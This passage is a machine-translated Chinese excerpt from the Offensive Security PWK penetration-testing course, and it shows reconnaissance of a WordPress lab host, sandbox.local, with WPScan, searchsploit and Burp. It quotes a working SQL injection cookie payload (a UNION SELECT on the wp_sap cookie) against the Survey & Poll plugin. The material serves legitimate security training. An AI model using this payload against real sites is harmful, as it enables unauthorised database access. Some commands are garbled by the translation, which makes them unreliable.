<div style="position:absolute;top:156675;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">发现者：自述文件 - ChangeLog 部分（主动检测）</font></font></nobr></div>
<div style="position:absolute;top:156692;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">- http://sandbox.local/wp-content/plugins/wp-survey-and-poll/readme.txt</font></font></nobr></div>
<div style="position:absolute;top:156726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 枚举所有主题（通过被动和主动方法）</font></font></nobr></div>
<div style="position:absolute;top:156743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:156762;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 860 - wpscan 扫描的输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:156791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们发现的最有趣的项目是安装的三个插件：elementor、</font></font></nobr></div>
<div style="position:absolute;top:156811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">海洋额外和 wp 调查和民意调查。</font><font style="vertical-align: inherit;">WPScan 有自己的漏洞数据库，该工具可以</font></font></nobr></div>
<div style="position:absolute;top:156830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用，但需要注册。</font><font style="vertical-align: inherit;">为了避免注册，因为我们只找到了三个插件，我们可以使用</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:156991;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="133"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 133 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:157024;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:158101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:158101;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:158101;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">750</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:157120;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以查找已安装插件中可能存在的漏洞。</font><font style="vertical-align: inherit;">更新searchsploit后</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:157139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">–update</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，我们可以搜索每个插件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:157174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit elementor</font></font></font></b></nobr></div>
<div style="position:absolute;top:157191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用：没有结果</font></font></nobr></div>
<div style="position:absolute;top:157225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit Ocean-extra</font></font></font></b></nobr></div>
<div style="position:absolute;top:157242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用：没有结果</font></font></nobr></div>
<div style="position:absolute;top:157276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit wp-survey-and-poll</font></font></font></b></nobr></div>
<div style="position:absolute;top:157293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用：没有结果</font></font></nobr></div>
<div style="position:absolute;top:157312;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 861 - Searchsploit 结果没有找到任何东西</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:157342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，我们没有发现任何漏洞。</font><font style="vertical-align: inherit;">我们需要小心我们的搜索方式，</font></font></nobr></div>
<div style="position:absolute;top:157361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而。</font><font style="vertical-align: inherit;">仅仅因为搜索“ocean-extra”没有找到任何东西，并不意味着什么都没有</font></font></nobr></div>
<div style="position:absolute;top:157380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存在。</font><font style="vertical-align: inherit;">我们将尝试使用更通用的搜索海洋额外，例如“海洋”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:157415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit 海洋</font></font></font></b></nobr></div>
<div style="position:absolute;top:157432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ---- -------------------------------</font></font></nobr></div>
<div style="position:absolute;top:157449;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题    </font></font></nobr></div>
<div style="position:absolute;top:157449;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">路径（/usr/share/exploitdb/）</font></font></nobr></div>
<div style="position:absolute;top:157466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ---- -------------------------------</font></font></nobr></div>
<div style="position:absolute;top:157483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache Libcloud 数字海洋 API - 本地信息 | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/38937.txt</font></font></nobr></div>
<div style="position:absolute;top:157500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ocean FTP Server 1.00 - 拒绝服务    </font></font></nobr></div>
<div style="position:absolute;top:157500;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">漏洞利用/windows/dos/893.pl</font></font></nobr></div>
<div style="position:absolute;top:157517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ocean12（多个产品）-'Admin_ID' SQL Injectio | </font><font style="vertical-align: inherit;">漏洞利用/asp/webapps/32602.txt</font></font></nobr></div>
<div style="position:absolute;top:157534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ocean12 ASP 日历管理器 1.0 - 身份验证 Byp | </font><font style="vertical-align: inherit;">漏洞利用/asp/webapps/26473.txt</font></font></nobr></div>
<div style="position:absolute;top:157551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ocean12 ASP 留言板管理器 1.0 - 信息光盘 | </font><font style="vertical-align: inherit;">漏洞利用/asp/webapps/22484.txt</font></font></nobr></div>
<div style="position:absolute;top:157568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ocean12 日历管理器 1.0 - 管理表单 SQL Injecti | </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/25469.txt</font></font></nobr></div>
<div style="position:absolute;top:157585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ocean12 Calendar Manager Gold - 数据库披露| </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/7247.txt</font></font></nobr></div>
<div style="position:absolute;top:157602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ocean12 Contact Manager Pro - SQL 注入/Cross-S | </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/7244.txt</font></font></nobr></div>
<div style="position:absolute;top:157619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ocean12 FAQ Manager Pro - 'ID' 盲注 SQL | </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/7271.txt</font></font></nobr></div>
<div style="position:absolute;top:157636;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ocean12 FAQ Manager Pro - 'Keyword' 跨站脚本 | </font><font style="vertical-align: inherit;">漏洞利用/asp/webapps/32601.txt</font></font></nobr></div>
<div style="position:absolute;top:157653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:157672;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 862 - Ocean 的 Searchsploit 结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:157702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅搜索“ocean”就给了我们一些结果，但查看输出结果表明没有一个是为了</font></font></nobr></div>
<div style="position:absolute;top:157721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个 WordPress 插件。</font><font style="vertical-align: inherit;">让我们对 wp-survey-and-poll 做同样的事情并搜索“survey poll”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:157756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit 调查问卷</font></font></font></b></nobr></div>
<div style="position:absolute;top:157773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ---- -------------------------------</font></font></nobr></div>
<div style="position:absolute;top:157789;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题    </font></font></nobr></div>
<div style="position:absolute;top:157789;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">路径（/usr/share/exploitdb/）</font></font></nobr></div>
<div style="position:absolute;top:157807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ---- -------------------------------</font></font></nobr></div>
<div style="position:absolute;top:157824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD-Pro 1.083.x - 调查模块'pollID' Blind SQL Inj | </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/9021.txt</font></font></nobr></div>
<div style="position:absolute;top:157841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHP-Nuke CMS（调查和投票）- SQL 注入    </font></font></nobr></div>
<div style="position:absolute;top:157841;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/11627.txt</font></font></nobr></div>
<div style="position:absolute;top:157858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pre Survey Poll - 'catid' SQL 注入    </font></font></nobr></div>
<div style="position:absolute;top:157858;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">漏洞利用/asp/webapps/6119.txt</font></font></nobr></div>
<div style="position:absolute;top:157874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WordPress Plugin Survey and Poll 1.1 - Blind SQL Inje | </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/36054.txt</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:157891;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wordpress 插件调查和民意调查 1.5.7.3 - 'sss_params' | </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/45411.txt</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:157908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nabopoll 1.2 - 'survey.inc.php?path' 远程文件包括 | </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/3315.txt</font></font></nobr></div>
<div style="position:absolute;top:157926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- --------------- ---------------------</font></font></nobr></div>
<div style="position:absolute;top:157945;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 863 - 用于调查和民意调查的 Searchsploit 结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:157974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种搜索看起来更有希望。</font><font style="vertical-align: inherit;">第四个和第五个结果似乎是针对我们的 WordPress</font></font></nobr></div>
<div style="position:absolute;top:157994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插入。</font><font style="vertical-align: inherit;">第五个结果，标题为“Wordpress Plugin Survey &amp; Poll 1.5.7.3”，也匹配</font></font></nobr></div>
<div style="position:absolute;top:158013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的插件 (1.5.7.3) 是由 WPScan 找到的。</font><font style="vertical-align: inherit;">让我们检查漏洞利用，看看我们是否发现了任何东西</font></font></nobr></div>
<div style="position:absolute;top:158032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有趣的。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:158179;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="134"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 134 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:158212;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:159289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:159289;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:159289;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">751</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:158310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:158327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">＃ 描述</font></font></nobr></div>
<div style="position:absolute;top:158344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 该漏洞允许攻击者使用 a 的值注入 sql 命令 </font></font></nobr></div>
<div style="position:absolute;top:158361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># cookie 参数。 </font></font></nobr></div>
<div style="position:absolute;top:158395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 概念验证</font></font></nobr></div>
<div style="position:absolute;top:158412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># Step 1. 当您访问有投票或调查的页面时，会出现一个问题 </font></font></nobr></div>
<div style="position:absolute;top:158428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 出现回答。</font></font></nobr></div>
<div style="position:absolute;top:158445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 回答这个问题。</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:158463;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># Step 2. 当你回答问题时，wp_sap 会被赋值。</font><font style="vertical-align: inherit;">打开</font></font></b></nobr></div>
<div style="position:absolute;top:158480;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 一个 cookie 管理器，并使用如下所示的有效负载更改它；</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:158513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]</font></font></nobr></div>
<div style="position:absolute;top:158547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 重要的是“OR”语句必须是 1=2。</font><font style="vertical-align: inherit;">因为，应用是</font></font></nobr></div>
<div style="position:absolute;top:158564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 反映查询的第一个结果。</font><font style="vertical-align: inherit;">当你让它 1=1 时，你应该看到一个</font></font></nobr></div>
<div style="position:absolute;top:158581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 来自第一条记录的问题。</font><font style="vertical-align: inherit;">因此 OR 语句必须返回 False。</font></font></nobr></div>
<div style="position:absolute;top:158615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># Step 3. 重新加载页面。</font><font style="vertical-align: inherit;">打开页面的源代码。</font><font style="vertical-align: inherit;">搜索“sss_params”。</font></font></nobr></div>
<div style="position:absolute;top:158632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 您将在 sss_params 参数的值中看到 DB 的版本。 </font></font></nobr></div>
<div style="position:absolute;top:158649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:158668;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 864 - 查看漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:158698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览漏洞并没有提到是否需要进一步的身份验证。</font><font style="vertical-align: inherit;">然而，一个</font></font></nobr></div>
<div style="position:absolute;top:158717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要设置cookie。</font><font style="vertical-align: inherit;">让我们去插件网站看看我们是否可以找到更多信息</font></font></nobr></div>
<div style="position:absolute;top:158737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于它。</font><font style="vertical-align: inherit;">在 Google 上快速搜索“Wordpress Survey &amp; Poll”会将我们带到插件页面。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">729</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">展望</font></font></nobr></div>
<div style="position:absolute;top:158756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过屏幕截图，我们找到了一个调查在页面上的样子的例子。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:159239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">729 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（WordPress，2020），https://wordpress.org/plugins/wp-survey-and-poll/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:159367;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="135"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 135 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:159400;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:160477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:160477;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:160477;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">752</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:159849;left:320"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 319：WordPress 调查和投票截图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:159881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在 sandbox.local 的主页上发现了一个类似的调查。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:160123;left:304"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 320：Sandbox.local 上的 WordPress 调查和投票</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:160154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们打开Burp Suite，在Firefox中配置代理设置，拦截通信</font></font></nobr></div>
<div style="position:absolute;top:160174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们与调查互动时。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:160236;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您在配置 Burp 时遇到问题，请返回 Web 应用程序</font></font></i></nobr></div>
<div style="position:absolute;top:160255;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块进行快速回顾。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:160317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载页面并配置 Burp 拦截后，我们将单击调查选项之一。</font></font></nobr></div>
<div style="position:absolute;top:160336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将导致在 Burp 中捕获请求。</font><font style="vertical-align: inherit;">我们将</font><font style="vertical-align: inherit;">在 Burp 中</font><font style="vertical-align: inherit;">单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Forward</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以继续该页面</font></font></nobr></div>
<div style="position:absolute;top:160356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:160555;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="136"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 136 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:160588;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:161665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:161665;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:161665;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">753</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:161010;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 321：从调查响应中捕获的请求 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:161743;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="137"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 137 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:161776;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:162853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:162853;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:162853;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">754</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:161866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:161887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，当我们重新加载页面时，我们注意到提到的漏洞利用代码的 cookie 是</font></font></nobr></div>
<div style="position:absolute;top:161906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">易受伤害的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:162242;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 322：使用易受攻击的 Cookie 捕获的请求</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:162273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有了这个cookie，我们就可以开始尝试利用SQL注入漏洞了。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:162931;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="138"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 138 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:162964;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:164041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:164041;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:164041;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">755</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:163054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.1.1.2</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:163076;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:163076;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SQL注入利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:163114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经用易受攻击的 cookie 捕获了一个请求，我们可以在 Burp 的“中继器”中使用它</font></font></nobr></div>
<div style="position:absolute;top:163134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试利用 SQL 注入。</font><font style="vertical-align: inherit;">为此，我们在 Burp 的“HTTP History”中找到请求</font></font></nobr></div>
<div style="position:absolute;top:163153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含 cookie 的选项卡，右键单击它，然后选择“发送到中继器”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
